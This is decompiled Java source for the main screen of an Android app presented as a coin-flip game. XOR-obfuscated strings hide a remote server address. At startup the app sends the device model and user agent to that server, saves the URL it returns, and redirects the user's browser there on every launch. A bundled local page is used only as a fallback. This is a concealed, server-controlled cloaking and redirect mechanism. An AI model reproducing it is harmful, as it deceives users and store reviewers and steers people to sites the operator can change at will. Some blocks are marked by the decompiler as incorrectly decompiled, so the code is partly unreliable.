package com.quicktoss.winflip;

import H.e;
import K.A0;
import K.y0;
import P0.c;
import Q0.h;
import T.t;
import W0.a;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.quicktoss.winflip.MainActivity;
import com.quicktoss.winflip.R;
import e1.d;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.o;
import i1.p;
import j1.b;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.TimeUnit;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1865D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1866A;

    /* renamed from: B, reason: collision with root package name */
    public final c f1867B;

    /* renamed from: C, reason: collision with root package name */
    public String f1868C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1869y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1870z;

    public MainActivity() {
        this.d.f2377b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        final int i = 0;
        this.f1869y = new c(new a(this) { // from class: N0.a

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f614b;

            {
                this.f614b = this;
            }

            @Override // W0.a
            public final Object a() {
                int i2 = 0;
                MainActivity mainActivity = this.f614b;
                switch (i) {
                    case 0:
                        int i3 = MainActivity.f1865D;
                        KeyEvent.Callback callback = null;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                        if (inflate instanceof ViewGroup) {
                            ViewGroup viewGroup = (ViewGroup) inflate;
                            int childCount = viewGroup.getChildCount();
                            while (true) {
                                if (i2 < childCount) {
                                    KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                                    if (findViewById != null) {
                                        callback = findViewById;
                                    } else {
                                        i2++;
                                    }
                                }
                            }
                        }
                        WebView webView = (WebView) callback;
                        if (webView != null) {
                            return new O0.a(constraintLayout, webView);
                        }
                        throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.f1870z, 0);
                }
            }
        });
        this.f1870z = t(new byte[]{18, 36, -108});
        this.f1866A = t(new byte[]{3, 55, -127, 34});
        final int i2 = 1;
        this.f1867B = new c(new a(this) { // from class: N0.a

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f614b;

            {
                this.f614b = this;
            }

            @Override // W0.a
            public final Object a() {
                int i22 = 0;
                MainActivity mainActivity = this.f614b;
                switch (i2) {
                    case 0:
                        int i3 = MainActivity.f1865D;
                        KeyEvent.Callback callback = null;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                        if (inflate instanceof ViewGroup) {
                            ViewGroup viewGroup = (ViewGroup) inflate;
                            int childCount = viewGroup.getChildCount();
                            while (true) {
                                if (i22 < childCount) {
                                    KeyEvent.Callback findViewById = viewGroup.getChildAt(i22).findViewById(R.id.webView);
                                    if (findViewById != null) {
                                        callback = findViewById;
                                    } else {
                                        i22++;
                                    }
                                }
                            }
                        }
                        WebView webView = (WebView) callback;
                        if (webView != null) {
                            return new O0.a(constraintLayout, webView);
                        }
                        throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.f1870z, 0);
                }
            }
        });
    }

    public static String t(byte[] bArr) {
        int[] iArr = {113, 66, 243, 78};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        return new String(h.z0(arrayList), e1.a.f1913a);
    }

    /* JADX WARN: Code restructure failed: missing block: B:31:0x01e3, code lost:
    
        r5 = r1;
     */
    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        setContentView(v().f618a);
        u();
        WebSettings settings = v().f619b.getSettings();
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        v().f619b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        g gVar2 = null;
        String string = ((SharedPreferences) this.f1867B.a()).getString(this.f1866A, null);
        if (string != null && !d.q0(string)) {
            this.f1868C = string;
            x(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{78, 35, -125, 62, 76});
        X0.d.d(getPackageName(), "getPackageName(...)");
        byte[] bArr = {25, 54, -121, 62, 2, 120, -36, 97, 6, 43, -99, 58, 20, 48, -34, 40, 3, 45, Byte.MIN_VALUE, 58, 92, 118, -63, 44, 21, 108, -97, 55, 5, 52, -123, 57, 31, 33, -112, 99, 31, 35, -121, 43, 20, 117, -59, 96, 6, 45, -127, 37, 20, 48, Byte.MIN_VALUE, 96, 21, 39, -123, 97};
        int[] iArr = {113, 66, 243, 78};
        ArrayList arrayList = new ArrayList(56);
        int i = 0;
        int i2 = 0;
        while (i < 56) {
            arrayList.add(Byte.valueOf((byte) (iArr[i2 % 4] ^ (bArr[i] & 255))));
            i++;
            i2++;
        }
        String str = new String(h.z0(arrayList), e1.a.f1913a) + t2 + packageName;
        o oVar = new o();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        X0.d.e(timeUnit, "unit");
        byte[] bArr2 = b.f2604a;
        long millis = timeUnit.toMillis(5L);
        if (millis > 2147483647L) {
            throw new IllegalArgumentException("timeout".concat(" too large.").toString());
        }
        if (millis == 0) {
            throw new IllegalArgumentException("timeout".concat(" too small.").toString());
        }
        oVar.f2473r = (int) millis;
        p pVar = new p(oVar);
        t tVar = new t(4);
        X0.d.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            X0.d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            X0.d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        X0.d.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f748a = lVar.a();
        String t3 = t(new byte[]{41, 111, -73, 43, 7, 43, -112, 43, 92, 15, -100, 42, 20, 46});
        String str2 = Build.MODEL;
        X0.d.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{48, 33, -112, 43, 1, 54, -34, 2, 16, 44, -108, 59, 16, 37, -106}), t(new byte[]{20, 44, -34, 27, 34, 110, -106, 32, 74, 51, -50, 126, 95, 123}));
        String t4 = t(new byte[]{36, 49, -106, 60, 92, 3, -108, 43, 31, 54});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        X0.d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        e b2 = tVar.b();
        B0.d dVar = new B0.d(9, this);
        j jVar = new j(pVar, b2);
        if (!jVar.f3232e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3572a;
        jVar.f3233f = n.f3572a.g();
        t tVar2 = pVar.f2479a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f749b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f750c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (X0.d.a(((m) gVar.f3226c.f3230b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f749b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (X0.d.a(((m) gVar.f3226c.f3230b.f213c).d, str3)) {
                        }
                    }
                }
            }
            if (gVar2 != null) {
                gVar3.f3225b = gVar2.f3225b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1868C;
        if (str != null) {
            x(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.Q();
        y0Var.q0();
    }

    public final O0.a v() {
        return (O0.a) this.f1869y.a();
    }

    public final void w() {
        v().f619b.setVisibility(0);
        v().f619b.loadUrl(t(new byte[]{23, 43, -97, 43, 75, 109, -36, 97, 16, 44, -105, 60, 30, 43, -105, 17, 16, 49, Byte.MIN_VALUE, 43, 5, 109, -102, 32, 21, 39, -117, 96, 25, 54, -98, 34}));
    }

    public final void x(String str) {
        v().f619b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            w();
        }
    }
}
